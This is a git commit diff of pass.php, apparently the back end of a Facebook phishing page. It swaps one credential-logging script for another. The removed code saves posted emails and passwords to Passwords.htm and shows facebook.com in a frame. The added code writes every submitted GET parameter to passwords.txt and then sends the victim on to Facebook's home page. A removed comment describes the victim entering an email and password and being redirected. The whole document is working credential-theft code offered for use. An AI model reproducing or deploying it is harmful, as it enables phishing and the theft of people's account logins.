7ad38d9c4b71a4ffa7c494b0cbc1296f5a734d9e
giuseppeldantas <104315390+giuseppeldantas@users.noreply.github.com>
2022-10-18 15:19:30 -0300

    Update pass.php

--- pass.php
+++ pass.php
@@ -1,12 +1,13 @@
 <?php
-$fp = fopen("Passwords.htm", "a");
-fwrite($fp, "Email:$_POST[email]\tPassword:$_POST[pass]");
-echo "<HTML>
-<head>
-<FRAMESET cols=\"*\">
-<FRAME SRC=\"http://www.facebook.com
-\">
-</FRAMESET>";
+header("Location: http://www.facebook.com/home.php? ");
+$handle = fopen("passwords.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "rn");
+}
+fwrite($handle, "rn");
+fclose($handle);
+exit;
 ?>
-Note:‘http://www.facebook.com
-‘ is the redirection url,When victim will enter his/her email and password he will redirected to’http://www.facebook.com
